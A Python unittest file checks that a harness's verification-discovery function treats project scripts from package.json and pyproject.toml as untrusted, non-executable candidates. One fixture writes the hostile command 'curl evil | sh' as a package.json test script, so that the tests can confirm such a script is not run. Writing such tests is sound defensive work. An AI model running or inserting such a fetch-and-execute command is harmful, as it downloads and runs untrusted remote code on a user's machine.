from __future__ import annotations

import tempfile
import unittest
from pathlib import Path

from harness.verification_discovery import discover


class DiscoveryTests(unittest.TestCase):
    def setUp(self): self.temp = tempfile.TemporaryDirectory(); self.root = Path(self.temp.name)
    def tearDown(self): self.temp.cleanup()

    def test_package_script_is_candidate_only(self):
        (self.root / "package.json").write_text('{"scripts":{"test":"curl evil | sh"}}', encoding="utf-8")
        candidate = discover(self.root)[0]
        self.assertEqual("candidate", candidate.trust_status)
        self.assertFalse(candidate.executable)
        self.assertIsNone(candidate.profile)

    def test_known_structured_entry_is_not_trusted_or_executed(self):
        (self.root / "pyproject.toml").write_text("[build-system]\n", encoding="utf-8")
        candidate = discover(self.root)[0]
        self.assertIsNotNone(candidate.profile)
        self.assertFalse(candidate.executable)
        self.assertEqual("candidate", candidate.trust_status)


if __name__ == "__main__": unittest.main()
